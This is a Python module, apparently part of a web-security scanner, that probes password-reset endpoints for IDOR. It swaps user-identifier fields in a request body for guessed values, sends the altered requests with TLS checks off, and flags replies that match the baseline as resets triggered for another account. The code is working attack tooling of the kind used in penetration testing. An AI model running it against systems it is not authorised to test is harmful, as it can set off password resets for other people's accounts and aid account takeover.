#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import json as _json
import re
import urllib.parse
from utils.style import Colors
from utils.utils import requests, detect_content_type


IDOR_PARAM_NAMES = [
    "user_id", "userId", "uid", "user", "id", "account_id", "accountId",
    "account", "profile_id", "profileId", "reset_id", "resetId",
    "pid", "cid", "customer_id", "customerId",
]

UUID_RE = re.compile(
    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
    re.IGNORECASE
)


def _extract_idor_params(body, content_type):
    found = []
    if not body:
        return found
    lower_names = [p.lower() for p in IDOR_PARAM_NAMES]

    if content_type == "json":
        try:
            data = _json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    if k.lower() in lower_names:
                        found.append((k, str(v)))
        except Exception:
            pass
    else:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
        for k, vals in parsed.items():
            if k.lower() in lower_names:
                found.append((k, vals[0]))
    return found


def _mutate_body(body, content_type, param_name, new_value):
    if content_type == "json":
        try:
            data = _json.loads(body)
            if isinstance(data, dict) and param_name in data:
                data[param_name] = new_value
                return _json.dumps(data)
        except Exception:
            pass
    else:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
        if param_name in parsed:
            parsed[param_name] = [new_value]
            return urllib.parse.urlencode(parsed, doseq=True)
    return body


def _response_differs(resp, baseline, threshold=0.15):
    if resp.status_code != baseline["status"]:
        return True, f"{baseline['status']} > {resp.status_code}"
    bl = baseline["body_length"]
    rl = len(resp.text)
    if bl > 0 and abs(rl - bl) / bl > threshold:
        return True, f"{bl}b > {rl}b"
    return False, None


def idor(url, parsed_req, baseline, interact, email, proxy=None):
    """
    IDOR on reset endpoint.
    Modifies user identifier params to trigger a reset for a different account.
    A response identical to baseline = the server accepted it → potential IDOR.
    """
    print(f"{Colors.CYAN} ├ IDOR analysis{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if not body:
        print(f"  {Colors.YELLOW}[!] No body — IDOR test skipped{Colors.RESET}")
        return

    content_type = detect_content_type(headers)
    idor_params = _extract_idor_params(body, content_type)

    if not idor_params:
        print(f"  {Colors.YELLOW}[!] No IDOR-relevant params found in body{Colors.RESET}")
        return

    print(f"{Colors.CYAN} └─ Mutating user identifiers{Colors.RESET}")

    for param_name, original_value in idor_params:
        print(f"{Colors.CYAN}     → {param_name}={original_value}{Colors.RESET}")

        if original_value.isdigit():
            n = int(original_value)
            mutations = [str(n + 1), str(n - 1), str(n + 2), str(n - 2),
                         "1", "2", "0", "99999"]
        elif UUID_RE.match(original_value):
            last = original_value[-1]
            flipped = '0' if last != '0' else '1'
            mutations = [
                original_value[:-1] + flipped,
                "00000000-0000-0000-0000-000000000001",
                "00000000-0000-0000-0000-000000000002",
            ]
        else:
            mutations = ["1", "2", "admin", original_value + "1"]

        for new_value in mutations:
            if new_value == original_value:
                continue
            try:
                mutated_body = _mutate_body(body, content_type, param_name, new_value)
                if mutated_body == body:
                    continue

                resp = requests.request(
                    method=method, url=uri, headers=headers,
                    data=mutated_body, verify=False, allow_redirects=False,
                    timeout=10, proxies=proxies,
                )

                differs, reason = _response_differs(resp, baseline)
                if not differs:
                    print(f"{Colors.RED}   └── [HIGH] {param_name}={new_value} accepted (≈ baseline) → potential IDOR{Colors.RESET}")
                    print(f"{Colors.RED}       Reset triggered for user '{new_value}' using attacker session{Colors.RESET}")
                    print(f"{Colors.RED}       payload: {mutated_body[:120]}{Colors.RESET}")
                elif resp.status_code not in [400, 403, 404, 422]:
                    print(f"{Colors.YELLOW}   └── [MEDIUM] {param_name}={new_value} → {reason}{Colors.RESET}")

            except requests.RequestException:
                pass
